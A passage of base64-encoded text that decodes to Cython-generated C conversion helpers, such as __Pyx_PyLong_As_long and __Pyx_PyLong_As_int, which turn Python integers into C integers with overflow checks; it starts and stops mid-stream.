PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE3CiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1NJWkUoeCkgPCAwKSkgewogICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbHNlCiAgICAgICAgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHgsIFB5X0ZhbHNlLCBQeV9MVCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSkKICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gMSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIHVuc2lnbmVkIGxvbmcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZyh4KSkKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgdW5zaWduZWQgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNVbnNpZ25lZExvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9IGVsc2UgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgX19QeXhfY29tcGFjdF9weWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkpCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7CiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpOwogICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpKSB7CiAgICAgICAgICAgICAgICBjYXNlIC0yOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgbG9uZywgLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZihsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIGxvbmcsIFB5TG9uZ19Bc0xvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpCiNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIHsKICAgICAgICBsb25nIHZhbDsKICAgICAgICBpbnQgcmV0ID0gLTE7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcygKICAgICAgICAgICAgeCwgJnZhbCwgc2l6ZW9mKHZhbCksIFB5X0FTTkFUSVZFQllURVNfTkFUSVZFX0VORElBTiB8IChpc191bnNpZ25lZCA/IFB5X0FTTkFUSVZFQllURVNfVU5TSUdORURfQlVGRkVSIHwgUHlfQVNOQVRJVkVCWVRFU19SRUpFQ1RfTkVHQVRJVkUgOiAwKSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHsKICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXQgPSAwOwogICAgICAgIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSkKICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbDsKICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX2xpdHRsZSwgIWlzX3Vuc2lnbmVkKTsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqdjsKICAgICAgICBQeU9iamVjdCAqc3RlcHZhbCA9IE5VTEwsICptYXNrID0gTlVMTCwgKnNoaWZ0ID0gTlVMTDsKICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDsKICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7CiAgICAgICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdCh4KSkpIHsKICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB2ID0gUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICAgICAgYXNzZXJ0KFB5TG9uZ19DaGVja0V4YWN0KHYpKTsKICAgICAgICB9CiAgICAgICAgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHYsIFB5X0ZhbHNlLCBQeV9MVCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSkgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKHYpOwogICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxOwogICAgICAgIH0KICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkoaXNfbmVnYXRpdmUpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIGlmIChpc19uZWdhdGl2ZSkgewogICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpOwogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghc3RlcHZhbCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ZXB2YWwgPSB2OwogICAgICAgIH0KICAgICAgICB2ID0gTlVMTDsKICAgICAgICB2YWwgPSAobG9uZykgMDsKICAgICAgICBtYXNrID0gUHlMb25nX0Zyb21Mb25nKCgxTCA8PCBjaHVua19zaXplKSAtIDEpOyBpZiAodW5saWtlbHkoIW1hc2spKSBnb3RvIGRvbmU7CiAgICAgICAgc2hpZnQgPSBQeUxvbmdfRnJvbUxvbmcoY2h1bmtfc2l6ZSk7IGlmICh1bmxpa2VseSghc2hpZnQpKSBnb3RvIGRvbmU7CiAgICAgICAgZm9yIChiaXRzID0gMDsgYml0cyA8IChpbnQpIHNpemVvZihsb25nKSAqIDggLSBjaHVua19zaXplOyBiaXRzICs9IGNodW5rX3NpemUpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0OwogICAgICAgICAgICBsb25nIGlkaWdpdDsKICAgICAgICAgICAgZGlnaXQgPSBQeU51bWJlcl9BbmQoc3RlcHZhbCwgbWFzayk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpOwogICAgICAgICAgICBQeV9ERUNSRUYoZGlnaXQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgdmFsIHw9ICgobG9uZykgaWRpZ2l0KSA8PCBiaXRzOwogICAgICAgICAgICB0bXAgPSBQeU51bWJlcl9Sc2hpZnQoc3RlcHZhbCwgc2hpZnQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7CiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDsKICAgICAgICB7CiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHJlbWFpbmluZ19iaXRzID0gKChpbnQpIHNpemVvZihsb25nKSAqIDgpIC0gYml0cyAtIChpc191bnNpZ25lZCA/IDAgOiAxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA+PSAoMUwgPDwgcmVtYWluaW5nX2JpdHMpKSkKICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7CiAgICAgICAgICAgIHZhbCB8PSAoKGxvbmcpIGlkaWdpdCkgPDwgYml0czsKICAgICAgICB9CiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsICYgKCgobG9uZykgMSkgPDwgKHNpemVvZihsb25nKSAqIDggLSAxKSkpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICAgICAgaWYgKGlzX25lZ2F0aXZlKQogICAgICAgICAgICAgICAgdmFsID0gfnZhbDsKICAgICAgICB9CiAgICAgICAgcmV0ID0gMDsKICAgIGRvbmU6CiAgICAgICAgUHlfWERFQ1JFRihzaGlmdCk7CiAgICAgICAgUHlfWERFQ1JFRihtYXNrKTsKICAgICAgICBQeV9YREVDUkVGKHN0ZXB2YWwpOwojZW5kaWYKICAgICAgICBpZiAodW5saWtlbHkocmV0KSkKICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICByZXR1cm4gdmFsOwogICAgfQpyYWlzZV9vdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBsb25nIik7CiAgICByZXR1cm4gKGxvbmcpIC0xOwpyYWlzZV9uZWdfb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAiY2FuJ3QgY29udmVydCBuZWdhdGl2ZSB2YWx1ZSB0byBsb25nIik7CiAgICByZXR1cm4gKGxvbmcpIC0xOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKngpIHsKI2lmZGVmIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQwojcHJhZ21hIEdDQyBkaWFnbm9zdGljIHB1c2gKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBpZ25vcmVkICItV2NvbnZlcnNpb24iCiNlbmRpZgogICAgY29uc3QgaW50IG5lZ19vbmUgPSAoaW50KSAtMSwgY29uc3RfemVybyA9IChpbnQpIDA7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwb3AKI2VuZGlmCiAgICBjb25zdCBpbnQgaXNfdW5zaWduZWQgPSBuZWdfb25lID4gY29uc3RfemVybzsKICAgIGlmICh1bmxpa2VseSghUHlMb25nX0NoZWNrKHgpKSkgewogICAgICAgIGludCB2YWw7CiAgICAgICAgUHlPYmplY3QgKnRtcCA9IF9fUHl4X1B5TnVtYmVyX0xvbmcoeCk7CiAgICAgICAgaWYgKCF0bXApIHJldHVybiAoaW50KSAtMTsKICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfaW50KHRtcCk7CiAgICAgICAgUHlfREVDUkVGKHRtcCk7CiAgICAgICAgcmV0dXJuIHZhbDsKICAgIH0KICAgIGlmIChpc191bnNpZ25lZCkgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5TG9uZ19Jc05lZyh4KSkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgX19QeXhfY29tcGFjdF91cHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkpCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7CiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpOwogICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKSB7CiAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFV